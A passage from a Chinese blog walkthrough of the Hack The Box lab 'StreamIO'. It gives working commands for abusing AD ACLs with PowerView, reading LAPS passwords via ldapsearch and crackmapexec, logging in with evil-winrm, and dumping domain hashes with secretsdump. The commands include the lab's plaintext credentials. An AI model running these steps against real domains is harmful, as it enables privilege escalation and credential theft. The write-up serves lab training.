+<h2 id="攻击路径总结"><a href="#攻击路径总结" class="headerlink" title="攻击路径总结"></a>攻击路径总结</h2><p><code>jdgodd</code> 这个用户拥有 <code>CORE STAFF</code> 这个组的 <code>Write Owner</code> 权限，然后 <code>CORE STAFF</code> 这个组能够读取属性 <code>ReadProperty</code>，本地部署有 <code>LAPS</code></p>
+<p><strong>提权路径就是：将当前用户</strong><code>jdgodd</code>，加入  <code>CORE STAFF</code> 这个组，然用组成员的身份，读取 LAPS</p>
+<h2 id="域控提权过程"><a href="#域控提权过程" class="headerlink" title="域控提权过程"></a>域控提权过程</h2><h3 id="PowerSploit-第三方工具"><a href="#PowerSploit-第三方工具" class="headerlink" title="PowerSploit 第三方工具"></a><code>PowerSploit</code> 第三方工具</h3><p><strong>目的：加速将当前用户</strong><code>jdgodd</code>，加入  <code>CORE STAFF</code> 这个组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202517972.png" alt="image-20260325203835678"></p>
+<p>**上传到靶机中 **<code>Evil-winRM</code> 建立的 shell 支持上传本地 kali 文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548120.png" alt="image-20260325204312639"></p>
+<blockquote>
+<p>**在当前会话中加载并执行 PowerView 脚本。 **</p>
+<table>
+<thead>
+<tr>
+<th><code>.</code></th>
+<th><strong>点号操作符（dot sourcing），在当前作用域中执行脚本</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.\powerview.ps1</code></td>
+<td><strong>当前目录下的 PowerView.ps1 脚本文件</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<h3 id="对-jdgodd-用户的凭据进行处理"><a href="#对-jdgodd-用户的凭据进行处理" class="headerlink" title="对 jdgodd 用户的凭据进行处理"></a>对 <code>jdgodd</code> 用户的凭据进行处理</h3><p><strong>可以打开</strong><code>bloodhound</code> 的详细操作帮助，只需要改变量即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548121.png" alt="image-20260325204820902"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202519914.png" alt="image-20260325205204599"></p>
+<h4 id="1-生成安全字符串密码"><a href="#1-生成安全字符串密码" class="headerlink" title="1. 生成安全字符串密码"></a>1. 生成安全字符串密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass = convertto-securestring &#x27;JDg0dd1s&amp;d0p3cr3@t0r&#x27; -AsPlainText -force</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：将明文密码转换为 PowerShell 安全字符串（<code>SecureString</code>），避免明文直接暴露在脚本或内存中。</li>
+<li><strong>参数解析</strong><ul>
+<li><code>convertto-securestring</code>：将普通字符串转换为安全字符串对象。</li>
+<li><code>-AsPlainText</code>：声明输入是明文，允许直接转换。</li>
+<li><code>-force</code>：强制执行转换（因为明文转安全字符串默认有安全警告，此参数绕过提示）。</li>
+</ul>
+</li>
+<li><strong>结果</strong>：变量 <code>$pass</code> 存储了加密后的密码对象，后续用于构造域凭据。</li>
+</ul>
+<hr>
+<h4 id="2-构造域凭据对象"><a href="#2-构造域凭据对象" class="headerlink" title="2. 构造域凭据对象"></a>2. 构造域凭据对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cred = new-object system.management.automation.pscredential(&#x27;streamio.htb\jdgodd&#x27;,$pass)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：基于用户名和安全字符串密码，创建一个 <strong>PSCredential</strong> 对象，用于后续需要身份验证的 AD 操作。</li>
+<li><strong>参数解析</strong><ul>
+<li><code>system.management.automation.pscredential</code>：.NET 类，用于封装用户名和密码。</li>
+<li><code>&#39;streamio.htb\jdgodd&#39;</code>：目标域用户名，格式为 <code>域\用户名</code>（<code>streamio.htb</code> 是域名，<code>jdgodd</code> 是用户名）。</li>
+<li><code>$pass</code>：上一步生成的安全字符串密码。</li>
+</ul>
+</li>
+<li><strong>结果</strong>：变量 <code>$cred</code> 存储了完整的域凭据，可直接传递给需要 <code>-Credential</code> 参数的命令。</li>
+</ul>
+<hr>
+<h4 id="3-查看域用户信息（前后两次）"><a href="#3-查看域用户信息（前后两次）" class="headerlink" title="3. 查看域用户信息（前后两次）"></a>3. 查看域用户信息（前后两次）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jdgodd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：查询本地 &#x2F; 域用户 <code>jdgodd</code> 的详细信息，用于对比权限操作前后的变化。</li>
+<li><strong>关键信息解读</strong><ul>
+<li>**第一次查询：全局组只有 **<code>*Domain Users</code>（默认域用户组，权限较低）。</li>
+<li>**第二次查询：全局组新增 **<code>*CORE STAFF</code>（说明权限操作已生效）。</li>
+</ul>
+</li>
+<li><strong>补充</strong>：<code>net user</code> 是传统 Windows 命令行工具，可快速查看用户状态、组归属、密码策略等。</li>
+</ul>
+<hr>
+<h4 id="4-为用户添加目标对象的-ACL-权限"><a href="#4-为用户添加目标对象的-ACL-权限" class="headerlink" title="4. 为用户添加目标对象的 ACL 权限"></a>4. 为用户添加目标对象的 ACL 权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-domainobjectacl -Credential $cred -Targetidentity &quot;Core Staff&quot; -principalIdentity &quot;streamio\jdgodd&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：为域用户 <code>streamio\jdgodd</code> 授予对域组 <code>Core Staff</code> 的 <strong>ACL（访问控制列表）权限</strong>，通常是为了获取修改 &#x2F; 加入该组的权限。</li>
+<li><strong>参数解析</strong><ul>
+<li><code>add-domainobjectacl</code>：PowerShell 命令（通常来自 AD 模块或渗透工具如 PowerView），用于修改 AD 对象的访问控制列表。</li>
+<li><code>-Credential $cred</code>：使用之前构造的域凭据执行操作（规避当前会话权限不足的问题）。</li>
+<li><code>-Targetidentity &quot;Core Staff&quot;</code>：目标 AD 对象（这里是域组 <code>Core Staff</code>）。</li>
+<li><code>-principalIdentity &quot;streamio\jdgodd&quot;</code>：被授予权限的安全主体（即域用户 <code>jdgodd</code>）。</li>
+</ul>
+</li>
+<li><strong>本质</strong>：先让用户获得对 <code>Core Staff</code> 组的控制权限，为后续加入组做准备。</li>
+</ul>
+<hr>
+<h4 id="5-将用户加入目标域组"><a href="#5-将用户加入目标域组" class="headerlink" title="5. 将用户加入目标域组"></a>5. 将用户加入目标域组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-domaingroupmember -credential $cred -identity &quot;Core Staff&quot; -members &quot;streamio\jdgodd&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong>：将域用户 <code>streamio\jdgodd</code> 直接添加到高权限域组 <code>Core Staff</code> 中，完成权限提升。</li>
+<li><strong>参数解析</strong><ul>
+<li><code>add-domaingroupmember</code>：AD 模块命令，用于向域组添加成员。</li>
+<li><code>-credential $cred</code>：使用构造的域凭据执行（若当前会话无权限，可通过已窃取的凭据提权操作）。</li>
+<li><code>-identity &quot;Core Staff&quot;</code>：目标域组。</li>
+<li><code>-members &quot;streamio\jdgodd&quot;</code>：要加入组的用户。</li>
+</ul>
+</li>
+<li><strong>结果</strong>：用户 <code>jdgodd</code> 获得 <code>Core Staff</code> 组的所有权限（若该组是高权限组，则实现横向移动 &#x2F; 权限提升）。</li>
+</ul>
+<h3 id="读取域控密码"><a href="#读取域控密码" class="headerlink" title="读取域控密码"></a>读取域控密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-adcomputer dc -properties * -credential $cred</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Get-ADComputer</code></td>
+<td><strong>AD PowerShell 模块中的命令，查询计算机对象</strong></td>
+</tr>
+<tr>
+<td><code>dc</code></td>
+<td><strong>要查询的计算机名称（可能是主机名</strong><code>dc</code> 或 <code>dc.streamio.htb</code>）</td>
+</tr>
+<tr>
+<td><code>-Properties *</code></td>
+<td><strong>获取该计算机对象的****所有属性</strong>（默认只返回部分属性）</td>
+</tr>
+<tr>
+<td><code>-Credential $cred</code></td>
+<td><strong>使用预先存储在</strong><code>$cred</code> 变量中的凭据进行身份验证</td>
+</tr>
+</tbody></table>
+<p><strong>使用指定的凭据查询 Active Directory 中名为 “dc” 的计算机对象的所有属性</strong>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202519927.png" alt="image-20260325205854693"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202519947.png" alt="image-20260325205757100"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548122.png" alt="image-20260325210208669"> **	**筛选</p>
+<h3 id="基于多种协议都可以读取-DC-密码"><a href="#基于多种协议都可以读取-DC-密码" class="headerlink" title="基于多种协议都可以读取 DC 密码"></a>基于多种协议都可以读取 DC 密码</h3><h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a><code>ldapsearch</code></h4><p>**比如 kali 中  **<code>LDAP</code> 搜索的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://10.129.64.152 -b &quot;dc=streamio,dc=htb&quot; -x -D jdgodd@streamio.htb -w &#x27;JDg0dd1s@d0p3cr3@t0r&#x27; &quot;(ms-MCs-admpwd=*)&quot; ms-mcs-admpwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ldapsearch</code></td>
+<td><strong>OpenLDAP 工具，用于向 LDAP 服务器（这里是域控制器）发起查询</strong></td>
+</tr>
+<tr>
+<td><code>-H ldap://10.129.64.152</code></td>
+<td><strong>指定目标 LDAP 服务器地址（域控制器 IP）</strong></td>
+</tr>
+<tr>
+<td><code>-b &quot;dc=streamio,dc=htb&quot;</code></td>
+<td><strong>设置查询的****基准 DN（Base Distinguished Name）</strong>，即从域根 <code>streamio.htb</code> 开始搜索</td>
+</tr>
+<tr>
+<td><code>-x</code></td>
+<td><strong>使用****简单身份验证</strong>（而非 SASL），配合 <code>-D</code> 和 <code>-w</code> 进行账号密码登录</td>
+</tr>
+<tr>
+<td><code>-D jdgodd@streamio.htb</code></td>
+<td><strong>绑定 LDAP 的身份（域用户 UPN 格式）</strong></td>
+</tr>
+<tr>
+<td><code>-w &#39;JDg0dd1s@d0p3cr3@t0r&#39;</code></td>
+<td><strong>绑定身份的明文密码</strong></td>
+</tr>
+<tr>
+<td><code>&quot;(ms-MCs-admpwd=*)&quot;</code></td>
+<td><strong>LDAP 过滤条件</strong>：只返回存在 <code>ms-MCs-AdmPwd</code> 属性的对象</td>
+</tr>
+<tr>
+<td><code>ms-mcs-admpwd</code></td>
+<td><strong>指定只返回该属性的值（避免返回过多无关信息）</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548123.png" alt="image-20260325210436126"></p>
+<h4 id="crackmapexec-1"><a href="#crackmapexec-1" class="headerlink" title="crackmapexec"></a><code>crackmapexec</code></h4><p><strong>虽然读取失败，但还是成功带回来了 admin 密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb streamio.htb -u jdgodd -p &#x27;JDg0dd1s@d0p3cr3@t0r&#x27; --laps --ntds</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>参数 &#x2F; 字段</strong></th>
+<th><strong>详细解释</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>crackmapexec smb</code></td>
+<td><strong>指定使用****SMB 协议</strong>进行攻击（Windows 域内 &#x2F; 内网最常用的管理协议），CME 是专业的域内渗透测试工具。</td>
+</tr>
+<tr>
+<td><code>streamio.htb</code></td>
+<td><strong>目标****域名 &#x2F; 域控制器 IP</strong>。</td>
+</tr>
+<tr>
+<td><code>-u jdgodd</code></td>
+<td><strong>使用已攻陷的域用户</strong><code>jdgodd</code> 进行登录（这是你之前权限维持后的低权限用户）。</td>
+</tr>
+<tr>
+<td><code>-p &#39;...&#39;</code></td>
+<td><strong>该用户的明文密码。</strong></td>
+</tr>
+<tr>
+<td><code>--laps</code></td>
+<td><strong>核心开关</strong>：启用 <strong>LAPS 攻击模块</strong>。作用：CME 会自动利用用户权限去读取 AD 中的 <code>ms-Mcs-AdmPwd</code> 属性，获取域控 &#x2F; 其他主机的<strong>本地管理员随机密码</strong>。</td>
+</tr>
+<tr>
+<td><code>--ntds</code></td>
+<td><strong>核心开关</strong>：尝试导出域数据库**<code>ntds.dit</code>**。作用：这是 Active Directory 的核心数据库，存储了域内所有用户（包括域管理员）的 <strong>NTLM Hash</strong>。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202713552.png" alt="image-20260325210813743"></p>
+<h2 id="获取系统最高权限"><a href="#获取系统最高权限" class="headerlink" title="获取系统最高权限"></a>获取系统最高权限</h2><p><code>LAPS</code> 可以明文或密文存储密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u administrator -p &#x27;passwd&#x27; -i streamio.htb</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><code>evil-winrm</code></th>
+<th><strong>一款专门用于****Windows WinRM 远程登录</strong>的渗透工具，轻量、稳定、支持上传下载</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-i streamio.htb</code></td>
+<td>**目标主机：**<strong>域控制器域名 &#x2F; IP</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202713553.png" alt="image-20260325211303394"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202703345.png" alt="image-20260325211545781"></p>
+<h2 id="转储域内-hash"><a href="#转储域内-hash" class="headerlink" title="转储域内 hash"></a>转储域内 hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/doc/python3-impacket/examples/secretsdump.py &#x27;streamio.htb/administrator:0;@$Z-794C.qmq&#x27;@streamio.htb</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>详细解释</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>secretsdump.py</code></td>
+<td><strong>Impacket 工具集中用于****远程提取 Windows 凭证</strong>的脚本，无需在目标机器上上传文件，通过 RPC&#x2F; SMB 协议远程操作</td>
+</tr>
+<tr>
+<td><code>streamio.htb/administrator</code></td>
+<td>**认证身份：**<strong>域名 \ 用户名</strong>，这里是域控本机管理员 <code>administrator</code>（注意：是本地管理员，不是域管理员）</td>
+</tr>
+<tr>
+<td><code>0;@$Z-794C.qmq</code></td>
+<td>**认证密码：**<strong>通过 LAPS 读取到的域控本地管理员密码</strong>（<code>0;</code> 是 LAPS 版本标记，真实密码为 <code>@$Z-794C.qmq</code>）</td>
+</tr>
+<tr>
+<td><code>@streamio.htb</code></td>
+<td>**目标主机：**<strong>域控制器的域名 &#x2F; IP</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202713554.png" alt="image-20260325211830977"></p>
+<h2 id="渗透过程总结"><a href="#渗透过程总结" class="headerlink" title="渗透过程总结"></a>渗透过程总结</h2><p><strong>nmap 扫描，端口信息发现是域控</strong></p>
+<p><strong>445 端口的 SMB 服务，常规上容易信息泄漏：</strong><code>smbmap，smbclient，crackmapexec，enum4linux</code></p>
+<p><strong>80 端口都是默认页面</strong></p>
+<p><strong>fuzz 子域名爆破</strong></p>
+<p><strong>443 主域名有登录页面，关于我们，提交信息给我们，没实质收获。</strong>	**watch 域名下流媒体数据页，存在 MSSQL 的手工注入，转储了数据库中的用户名和对应 hash，hydra 爆破。 **	<strong>其中多次使用目录爆破</strong>	** **</p>
+<p><strong>参数模糊 fuzz 测试发现 debug 页面</strong>	<strong>通过伪协议本地文件包含获得</strong><code>master.php</code> 的源码，根据代码审计，构造远程文件包含，从而反弹 shell，获得 youshihide 用户的 shell</p>
+<p><strong>提权枚举过程中，通过查找 web 应用的 database 相关配置文件，获得数据库访问权限（管理员与普通库用户密码），掠夺备份数据库 backup 的账户，获得 nikk37 的 shell</strong></p>
+<p><strong>提权枚举时通过破解 Firefox 的存储凭据，获得 jdgodd 用户凭据，但该用户没有远程桌面或 winrm 的权限，用 bloodhound 和纯手工实现提权路径分析获得域控制器 administrator</strong></p>
+<h2 id="工具-技术-思路总结"><a href="#工具-技术-思路总结" class="headerlink" title="工具&amp;技术&amp;思路总结"></a>工具&amp;技术&amp;思路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#工具总结#</span><br><span class="line"></span><br><span class="line">wfuzz	模糊测试</span><br><span class="line">smbmap</span><br><span class="line">hosts	文件的配置</span><br><span class="line">crackmapexec---数据库cmedb</span><br><span class="line">enum4linux</span><br><span class="line">hydra</span><br><span class="line">gobuster</span><br><span class="line">feroxbuster</span><br><span class="line">sed\awk\tr\paste命令行文本工具</span><br><span class="line">hashcat</span><br><span class="line">hash-identifier</span><br><span class="line">john</span><br><span class="line">curl</span><br><span class="line">sqlcmd	windows下的sql命令行管理工具</span><br><span class="line">evil-winrm</span><br><span class="line">firepwd.py	破解Firefox用户凭据</span><br><span class="line">smbserver.py</span><br><span class="line">bloodhound	域渗透枚举重要工具</span><br><span class="line">bloodhound.py	域内信息采集器</span><br><span class="line">sqlite	轻量数据存储</span><br><span class="line">neo4j	bloodhound的配套数据库</span><br><span class="line">powershell相关的枚举（enum）</span><br><span class="line">powerview.ps1</span><br><span class="line">ldapsearch</span><br><span class="line">secretsdump.py	impacket工具包中转储hash</span><br><span class="line">laps</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#技术总结#</span><br><span class="line"></span><br><span class="line">fuzz模糊测试</span><br><span class="line">简单waf</span><br><span class="line">mssql注入/手工</span><br><span class="line">php伪协议文件包含</span><br><span class="line">php代码审计</span><br><span class="line">firefox存储凭据破解</span><br><span class="line">密码暴力破解</span><br><span class="line">域内横向移动</span><br><span class="line">powershell枚举</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#思路总结#</span><br><span class="line"></span><br><span class="line">1.靶机为域控制器，要重点关注SMB，LDAP,RPC等的枚举工具尝试获取敏感信息</span><br><span class="line">2.子域名不常见就要想到子域名爆破</span><br><span class="line">3.sql注入时，判读好数据库类型，结合查询交互做出注入可能性判断</span><br><span class="line">4.php的debug模式下，能做哪些尝试，要以开发和运维的视角理解可利用性</span><br><span class="line">5.看到Firefox安装（活跃用户）和LAPS的安装（密码读取的可能性），要能想到利用的场景和条件</span><br><span class="line">6.随渗透的进程和信息，判断能干什么？用哪些工具？什么原理？比如evil-winrm的使用，impacket框架的使用，powerview框架的使用...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>按功能分类的核心功能介绍：</strong></p>
+<h3 id="一、信息收集与枚举"><a href="#一、信息收集与枚举" class="headerlink" title="一、信息收集与枚举"></a>一、信息收集与枚举</h3><ul>
+<li><strong>smbmap</strong>：枚举 Windows 主机 SMB 共享目录、权限，支持文件下载。</li>
+<li><strong>enum4linux</strong>：基于 SMB 的 Linux 枚举工具，可收集用户、共享、策略等信息。</li>
+<li><strong>ldapsearch</strong>：通过 LDAP 协议查询 Active Directory，用于域环境信息收集。</li>
+<li><strong>bloodhound.py</strong>：AD 域内数据采集器，收集用户、组、会话等关系数据。</li>
+<li><strong>powershell &#x2F; powerview.ps1</strong>：PowerShell 环境下的 AD 域枚举脚本，查询用户、组、ACL 等。</li>
+</ul>
+<h3 id="二、漏洞探测与模糊测试"><a href="#二、漏洞探测与模糊测试" class="headerlink" title="二、漏洞探测与模糊测试"></a>二、漏洞探测与模糊测试</h3><ul>
+<li><strong>wfuzz</strong>：Web 应用模糊测试工具，支持目录爆破、参数注入、HTTP 头测试等。</li>
+<li><strong>gobuster &#x2F; feroxbuster</strong>：目录&#x2F;文件&#x2F;子域名暴力破解工具，支持字典爆破与递归扫描。</li>
+<li><strong>hydra</strong>：网络登录密码爆破工具，支持 SSH、FTP、HTTP 等多种协议。</li>
+<li><strong>crackmapexec</strong>：内网渗透瑞士军刀，支持 SMB、WinRM、LDAP 等协议的批量认证、枚举与命令执行，配套数据库 <code>cmedb</code> 管理结果。</li>
+</ul>
+<h3 id="三、凭据获取与破解"><a href="#三、凭据获取与破解" class="headerlink" title="三、凭据获取与破解"></a>三、凭据获取与破解</h3><ul>
+<li><strong>hashcat</strong>：高性能密码哈希破解工具，支持 GPU 加速和多种哈希算法。</li>
+<li><strong>john</strong> (John the Ripper)：经典密码哈希破解工具，支持字典、规则和增量模式。</li>
+<li><strong>hash-identifier</strong>：识别哈希类型，为破解选择正确算法。</li>
+<li><strong>secretsdump.py</strong> (impacket)：从域控或本地转储 NTLM 哈希、Kerberos 票据。</li>
+<li><strong>firepwd.py</strong>：解密 Firefox 浏览器存储的密码。</li>
+<li><strong>laps</strong> (Local Administrator Password Solution)：管理并获取域中本地管理员密码的工具。</li>
+</ul>
+<h3 id="四、权限维持与横向移动"><a href="#四、权限维持与横向移动" class="headerlink" title="四、权限维持与横向移动"></a>四、权限维持与横向移动</h3><ul>
+<li><strong>evil-winrm</strong>：基于 WinRM 协议的高交互 PowerShell 远程管理工具，常用于内网横向移动。</li>
+<li><strong>smbserver.py</strong> (impacket)：在攻击机创建 SMB 服务器，用于文件传输和 payload 投递。</li>
+<li><strong>bloodhound</strong>：图形化 AD 攻击路径分析工具，通过 Neo4j 数据库展示域内最短攻击路径。</li>
+</ul>
+<h3 id="五、数据与文本处理"><a href="#五、数据与文本处理" class="headerlink" title="五、数据与文本处理"></a>五、数据与文本处理</h3><ul>
+<li><strong>sed &#x2F; awk &#x2F; tr &#x2F; paste</strong>：Linux 命令行文本处理工具，用于日志分析、数据清洗、格式转换。</li>
+<li><strong>sqlcmd</strong>：Windows 下 SQL Server 命令行管理工具，可执行 SQL 查询和脚本。</li>
+<li><strong>sqlite &#x2F; neo4j</strong>：数据库：SQLite 用于轻量数据存储；Neo4j 作为 BloodHound 的图数据库后端。</li>
+</ul>
+<h3 id="六、系统与网络配置"><a href="#六、系统与网络配置" class="headerlink" title="六、系统与网络配置"></a>六、系统与网络配置</h3><ul>
+<li><strong>hosts</strong>：系统主机名解析文件，用于本地域名映射（如绕过 DNS、测试环境配置）。</li>
+<li><strong>curl</strong>：命令行 HTTP 客户端，支持多种协议，用于接口测试、文件下载、模拟请求。</li>
+</ul>
+<hr>
+<p><strong>建议组合使用</strong>：</p>
+<ul>
+<li><strong>域渗透常用组合：</strong><code>bloodhound.py</code> 采集 → <code>neo4j</code> + <code>bloodhound</code> 分析 → <code>crackmapexec</code> &#x2F; <code>evil-winrm</code> 横向 → <code>secretsdump.py</code> 抓 hash → <code>hashcat</code> 破解。</li>
+<li><strong>Web 渗透常用组合：</strong><code>wfuzz</code> &#x2F; <code>gobuster</code> 发现路径 → <code>curl</code> 验证 → <code>hydra</code> 爆破登录。</li>
+</ul>
+</blockquote>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/03/26/域渗透靶机HTB-StreamIO/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9AHTB-StreamIO%E5%BC%80%E5%B1%80"><span class="toc-number">1.</span> <span class="toc-text">靶机精讲：HTB StreamIO开局</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">TCP 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">UDP 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">漏洞脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%85%88%E7%BA%A7%E5%92%8C%E8%B7%AF%E5%BE%84"><span class="toc-number">1.2.5.</span> <span class="toc-text">优先级和路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%AE%9A%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%EF%BC%88%E6%9C%AC%E5%9C%B0-hosts-%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">设定域名解析（本地 hosts 文件）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.</span> <span class="toc-text">子域名爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F%E2%80%93%E5%9B%9B%E4%B8%AA%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.</span> <span class="toc-text">SMB 服务渗透–四个常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smbmap"><span class="toc-number">1.5.1.</span> <span class="toc-text">smbmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbclient"><span class="toc-number">1.5.2.</span> <span class="toc-text">smbclient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackmapexec"><span class="toc-number">1.5.3.</span> <span class="toc-text">crackmapexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E6%9C%AC%E5%9C%B0-hosts-%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.4.</span> <span class="toc-text">补充本地 hosts 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enum4linux"><span class="toc-number">1.5.5.</span> <span class="toc-text">enum4linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80-%E7%AB%AF%E5%8F%A3-web-%E6%B8%97%E9%80%8F"><span 